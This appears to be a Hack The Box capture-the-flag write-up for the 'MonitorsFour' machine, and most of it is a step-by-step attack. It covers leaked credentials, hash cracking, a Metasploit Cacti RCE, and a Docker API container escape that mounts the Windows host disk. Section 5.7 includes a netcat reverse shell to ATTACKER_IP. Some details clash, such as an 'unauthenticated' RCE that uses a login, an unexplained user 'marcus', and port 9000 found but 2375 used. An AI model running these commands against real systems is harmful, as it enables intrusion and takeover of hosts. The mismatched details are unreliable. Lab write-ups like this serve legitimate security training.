# MonitorsFour — HTB (Easy)

> **IP:** `TARGET_IP`
> **Domain:** `monitorsfour.htb`
> **Host OS:** Windows 11 Pro (Docker Desktop running Linux containers)
> **Difficulty:** Easy

---

## 1. Initial Reconnaissance

### 1.1 Nmap
Relevant open ports:

```
80/tcp    open  http    nginx
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### 1.2 Add host entry
```bash
echo "TARGET_IP monitorsfour.htb" | sudo tee -a /etc/hosts
```

Possible email target spotted on the site:
```
sales@monitorsfour.htb
```

---

## 2. Web Enumeration

### 2.1 Directory fuzzing
```bash
ffuf -u http://monitorsfour.htb/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

### 2.2 API fuzzing
```bash
ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

Endpoints found:
```
auth      [Status: 405]
logout    [Status: 302]
user      [Status: 200]
users     [Status: 200]
```

### 2.3 Information leak: `.env`
Leaks database credentials:
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### 2.4 Virtual-host enumeration
```bash
gobuster vhost -u http://monitorsfour.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

Result:
```
cacti.monitorsfour.htb  Status: 302 [Size: 0] [--> /cacti]
```

---

## 3. Exploitation — Cacti 1.2.28

The identified version is vulnerable to **unauthenticated RCE** (CVE-2025-66399 / SNMP command-injection chain).

### 3.1 Fuzzing `/cacti`
```bash
ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
  -H "Host: cacti.monitorsfour.htb" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 0 -t 50 -c
```

### 3.2 Deeper fuzzing with extensions
```bash
ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
  -H "Host: cacti.monitorsfour.htb" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -e .php,.txt,.bak,.old,.sql,.env \
  -c -t 50 -fw 1,604
```

Discovered: `http://cacti.monitorsfour.htb/cacti/cacti.sql`

### 3.3 SQL dump analysis

**Plaintext SNMP v3 credentials** (`automation_snmp_items` table):
```
user:     admin
password: baseball
```

**User hashes** (`user_auth`):
```
admin  :  21232f297a57a5a743894a0e4a801fc3   (MD5 of "admin")
guest  :  43e9a4ab75570f5b                   (enabled!)
```

### 3.4 Leaking users through the API
```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

Returns all users with their MD5 hashes:
```
admin       : 56b32eb43e6f15395f6c46c1c9e1cd36
mwatson     : 69196959c16b26ef00b77d82cf6eb169
janderson   : 2a22dcf99190c322d974c8df5ba3256b
dthompson   : 8d4a7e7fd08555133e056d9aacb1e519
```

Cracked admin hash:
```
admin : wonderful1
```

Generated API token: `f54b3c9a7fb6fe6ae7`

### 3.5 Login to Cacti
Reusing credentials: **`marcus:wonderful1`** → access to `cacti.monitorsfour.htb`.

---

## 4. RCE with Metasploit

```
msfconsole
use multi/http/cacti_graph_template_rce
set RHOSTS cacti.monitorsfour.htb
set VHOST  cacti.monitorsfour.htb
set TARGET 0          # Linux (container)
set LHOST  tun0
run
sessions -i 1
shell
/bin/bash -i
```

---

## 5. Container Escape → Windows Host

### 5.1 Environment check
```bash
ls /.dockerenv                       # inside a container
cat /proc/self/status | grep CapEff  # 0000000000000000 (no extra caps)
ls -la /var/run/docker.sock          # not exposed
```

### 5.2 Open ports inside the container
```bash
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
```
Detects:
```
tcp  LISTEN  0  4096  *:9000  *:*
```

### 5.3 Unauthenticated Docker API
```bash
curl http://DOCKER_HOST_IP:2375/version
curl http://DOCKER_HOST_IP:2375/containers/json
```

The metadata reveals the project path on the host:
```
"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"
```

### 5.4 Create a privileged container with full disk mount
```bash
curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["sleep", "infinity"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/mnt/host/c/:/mnt/windows"]
    }
  }'
```

### 5.5 Start the container
```bash
curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
```

### 5.6 Verify the mount
```bash
curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
  -d '{
    "Cmd": ["ls", "-la", "/mnt/windows/Users"],
    "AttachStdout": true,
    "AttachStderr": true
  }'
```

### 5.7 Reverse shell from the privileged container
```bash
EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/pwned/exec \
  -d '{"Cmd": ["nc", "ATTACKER_IP", "5555", "-e", "/bin/sh"], "AttachStdout": true, "AttachStderr": true}' \
  | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)

curl -X POST -H "Content-Type: application/json" \
  "http://DOCKER_HOST_IP:2375/exec/$EXEC_ID/start" \
  -d '{"Detach": false, "Tty": false}' --no-buffer &
```

### 5.8 Reading the flag
```bash
df -h | grep windows
# C:\   29.1G   25.2G   3.9G   86%   /mnt/windows
cd /mnt/windows/Users/Administrator/Desktop
cat root.txt
```

---

## Lessons Learned

- Always check vulnerable versions of exposed apps (Cacti 1.2.28 → public RCE).
- Docker API on `2375/tcp` without TLS = trivial host RCE.
- On Docker Desktop for Windows, `/mnt/host/c/` inside the container maps to the host's `C:\` drive.
- A `Privileged: true` container with a bind to the host disk is game over.
